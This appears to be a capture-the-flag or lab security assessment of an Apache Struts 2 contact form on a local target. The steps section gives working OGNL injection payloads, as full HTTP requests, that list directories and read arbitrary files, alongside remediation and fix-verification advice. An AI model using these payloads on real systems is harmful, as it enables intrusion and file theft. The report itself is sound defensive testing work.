# Security Assessment Report: Apache Struts OGNL Injection

## TL;DR
- **Objective:** Find a way into the target application and access files in /tmp
- **Outcome:** Successfully exploited OGNL injection to read arbitrary files and extract the flag
- **Highest-impact finding:** OGNL Expression Language Injection (CVE-2017-5638 style) in message form allowing arbitrary file system access
- **Validation status:** ACHIEVED - Flag extracted from /tmp/flag

---

## Target Information
- **Target:** 127.0.0.1:32941
- **Host / base URL:** http://127.0.0.1:32941/
- **Application:** Apache Struts 2.x (Java web application)
- **Component:** Customer Service contact form at /sendMessageAction.action
- **Authentication context:** None required - publicly accessible
- **Session management:** JSESSIONID cookie (HttpOnly flag set), URL rewriting support via jsessionid parameter
- **Technology details:** Java web application using Apache Struts 2.x framework (indicated by .action endpoints and wwFormTable CSS class)

---

## Confirmed Vulnerability

### OGNL Expression Language Injection
- **Affected endpoint:** POST /sendMessageAction.action
- **Affected parameter:** `message` (form field)
- **Impact:** Arbitrary code execution, file system enumeration and arbitrary file read
- **Preconditions:**
  - Request must use `Content-Type: multipart/form-data` encoding
  - OGNL payload must be injected into the message form field
- **Exact payload or PoC:**
  ```
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="message"
  
  %{7*7}
  ------WebKitFormBoundary--
  ```
- **Confirmation response:** Payload `%{7*7}` renders as "49", `%{1+1}` renders as "2"

### Arbitrary File Read via OGNL
- **Affected endpoint:** POST /sendMessageAction.action
- **Impact:** Read any file on the file system accessible to the application process
- **Preconditions:** OGNL injection confirmed active
- **Exact payload patterns:**
  - List directory contents: OGNL using `new java.io.File('/tmp').listFiles()`
  - Read file contents: OGNL using `BufferedReader` + `FileInputStream` to read `/tmp/flag`

---

## Steps to Reproduce

### Step 1: Verify OGNL Injection Capability

Send a multipart POST request with mathematical expression:

```http
POST /sendMessageAction.action HTTP/1.1
Host: 127.0.0.1:32941
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="message"

%{7*7}
------WebKitFormBoundary--
```

**Expected result:** Response contains "49" confirming OGNL evaluation.

### Step 2: Enumerate /tmp Directory

Send multipart POST with OGNL payload to list files:

```http
POST /sendMessageAction.action HTTP/1.1
Host: 127.0.0.1:32941
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="message"

%{#f=new java.io.File('/tmp'),#files=#f.listFiles(),#result="",#for(#file:#files){#result=#result+#file.getName()+"\n"},#result}
------WebKitFormBoundary--
```

**Expected result:** Response contains directory listing showing:
- `hsperfdata_root`
- `flag`

### Step 3: Read Flag File

Send multipart POST with OGNL payload to read file contents:

```http
POST /sendMessageAction.action HTTP/1.1
Host: 127.0.0.1:32941
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="message"

%{#reader=new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream('/tmp/flag'))),#content="",#line=#reader.readLine(),#while(#line!=null){#content=#content+#line+"\n",#line=#reader.readLine()},#content}
------WebKitFormBoundary--
```

**Expected result:** Response contains the flag value.

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{3dbdb05c438ae43f40e7f2a66930265b5b706b8d5b30fa4a781c3cffaacdf8ca}
```

**Tool evidence:** Flag found via pattern match from successful OGNL exploitation.

### Request Evidence
The exploitation succeeded by sending OGNL payloads via **multipart/form-data** encoding. The critical finding was that standard URL-encoded form data did not trigger the vulnerability - only multipart/form-data content type permitted OGNL expression evaluation.

### Response Evidence
- Mathematical evaluation proof: `%{7*7}` → "49"
- Mathematical evaluation proof: `%{1+1}` → "2"
- Directory listing revealed: `/tmp/hsperfdata_root` and `/tmp/flag`
- File read successfully extracted flag from `/tmp/flag`

### Notes on Reliability / Limitations
- **Reliability:** High - vulnerability is reliably exploitable with multipart/form-data encoding
- **Encoding requirement:** Standard URL-encoded form data does NOT trigger the vulnerability
- **Timing:** No race conditions observed
- **Browser test:** Not required - vulnerability is confirmable via direct HTTP requests

---

## Remediation

### Root Cause
The Apache Struts 2 application evaluates OGNL (Object-Graph Navigation Language) expressions in form input fields when processing multipart/form-data requests. The application fails to sanitize or escape user input before passing it to the OGNL expression parser, allowing arbitrary OGNL expression injection.

This is similar to CVE-2017-5638 (Struts-Shock) where improper handling of Content-Type headers in multipart requests leads to OGNL injection and remote code execution.

### Recommended Fix

1. **Immediate - Input Sanitization:**
   - Implement strict input validation and sanitization on all form fields
   - Escape or reject input containing OGNL metacharacters (`%{`, `}`, `#`, `$`)

2. **Short-term - Framework Updates:**
   - Upgrade Apache Struts 2 to the latest patched version
   - For CVE-2017-5638 specifically, upgrade to Struts 2.3.32 or 2.5.10.1 or later
   - Apply all security patches for OGNL expression handling

3. **Configuration Hardening:**
   - Disable OGNL expression evaluation where not required
   - Configure Struts to reject suspicious Content-Type headers
   - Implement a Web Application Firewall (WAF) with rules for OGNL injection patterns

4. **Disable DevMode:**
   - Ensure `struts.devMode` is set to `false` in production
   - DevMode exposes additional OGNL debugging capabilities

### Defense-in-Depth
- Implement network segmentation to limit file system access from the web application process
- Run the application with minimal privileges (non-root user)
- Monitor for suspicious multipart requests containing OGNL patterns
- Enable comprehensive logging for all form submissions

---

## How to Verify the Fix

1. **Test OGNL Evaluation is Blocked**
   
   Resend the mathematical evaluation payload:
   ```
   POST /sendMessageAction.action
   Content-Type: multipart/form-data
   
   message=%{7*7}
   ```
   
   **Expected secure result:** Response contains literal string `%{7*7}` (not evaluated to "49")

2. **Test File Access is Blocked**
   
   Attempt directory listing payload:
   ```
   message=%{#f=new java.io.File('/tmp')...
   ```
   
   **Expected secure result:** Response contains literal payload string or sanitized input, not directory contents

3. **Regression Test Normal Functionality**
   
   Submit a normal message:
   ```
   message=Hello, this is a test message
   ```
   
   **Expected secure result:** Application processes the message normally without OGNL evaluation errors

4. **Verify WAF Blocking (if deployed)**
   
   Confirm WAF blocks requests containing OGNL patterns and logs the attempt.

---

## Remaining Leads

### Confirmed Blockers
- None - full exploitation chain documented and verified

### Unverified Leads
- **Write capability:** Assessment focused on file read; write access to filesystem not tested
- **Code execution beyond file read:** Direct RCE via process execution not explicitly tested
- **Other endpoints:** Only /sendMessageAction.action was tested; other .action endpoints may have similar vulnerabilities
- **Session fixation:** jsessionid URL parameter support suggests potential for session-based attacks

### Missing Context
- Exact Struts 2.x version number not determined
- Whether other OGNL injection variants (CVE-2018-11776, etc.) are applicable
- Application's intended legitimate use case for the message form
- Whether WAF or IDS was in place during testing
